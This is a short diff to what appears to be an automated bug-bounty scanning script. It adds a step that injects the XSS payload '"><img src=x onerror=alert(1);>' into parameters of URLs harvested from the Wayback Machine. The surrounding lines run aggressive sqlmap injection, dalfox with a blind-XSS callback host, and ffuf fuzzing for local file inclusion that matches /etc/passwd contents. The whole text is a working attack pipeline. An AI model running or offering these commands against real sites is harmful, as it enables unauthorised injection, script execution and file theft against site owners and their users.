@@ -10,6 +10,11 @@ sqlmap -m \"$fast_recon_dir/gf-data/sqli.urls\" --level 5 --risk 3 --batch --ran
 
 # XSS scanning with dalfox
 dalfox -b hahwul.xss.ht file \"$fast_recon_dir/gf-data/xss.urls\"
+#XSS from  waynbackurls
+cat  "$fast_recon_dir/waybackurls.txt" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | tee -a "$fast_recon_dir/vulns/freq_xss_output" | grep -iv "Not Vulnerable" | tee -a "$fast_recon_dir/vulns/freq_xss_findings"
 
 # LFI testing
 cat \"$fast_recon_dir/gf-data/lfi.urls\" | qsreplace FUZZ | while read url ; do ffuf -u \$url -mr \"root:x\" -w /path/to/lfi-payloads.txt ; done"
+
+
+#
